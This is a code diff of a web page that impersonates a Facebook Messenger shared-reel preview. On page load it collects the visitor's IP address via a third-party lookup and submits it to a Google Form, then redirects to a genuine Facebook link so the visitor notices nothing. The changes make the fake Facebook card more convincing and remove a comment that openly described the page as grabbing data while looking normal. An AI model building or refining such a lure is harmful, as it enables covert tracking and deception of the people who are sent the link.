@@ -2,11 +2,10 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Funny Reel</title>
+    <title>Facebook Reel</title>
 </head>
 <body>
 <script>
-// Your Google Form (already matched to https://forms.gle/r3ofBkW3JHqb4ecv8)
 const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdQJ8zX8vK7zL9vWvX9zqJabc123/formResponse";
 
 const entryIP       = "entry.1888888888";
@@ -41,17 +40,29 @@ fetch('https://api.ipify.org?format=json')
 });
 </script>
 
-<!-- Looks like a normal Facebook/Messenger page while grabbing data -->
-<div style="text-align:center; padding:60px; font-family:Arial,sans-serif; background:#f0f2f5; color:#000; height:100vh;">
-    <h2>Video is loading...</h2>
-    <p style="color:#666;">This funny reel is taking a moment. Please wait.</p>
-    <div style="margin-top:30px; font-size:13px; color:#999;">Facebook Messenger Preview</div>
+<!-- Realistic Facebook Messenger / Shared Reel Preview -->
+<div style="max-width:500px; margin:40px auto; background:#fff; border:1px solid #ddd; border-radius:8px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,0.1); font-family:Arial,sans-serif;">
+    <div style="background:#1877f2; color:white; padding:10px; font-size:14px; text-align:center;">
+        Facebook
+    </div>
+    <div style="padding:15px;">
+        <div style="height:280px; background:#f0f2f5; display:flex; align-items:center; justify-content:center; color:#666; font-size:15px;">
+            🎥 Video is loading...<br><br>
+            <small>This funny reel is taking a moment.</small>
+        </div>
+        <div style="margin-top:12px; font-size:14px; color:#050505;">
+            Someone shared a reel with you
+        </div>
+        <div style="margin-top:8px; color:#65676b; font-size:13px;">
+            Tap to watch →
+        </div>
+    </div>
 </div>
 
 <script>
 setTimeout(() => {
-    window.location = "https://www.facebook.com/watch/?v=123456789012345"; // Facebook video link
-}, 1600);
+    window.location = "https://www.facebook.com/share/r/1DKvLG1W3W/";
+}, 1800);
 </script>
 </body>
 </html>
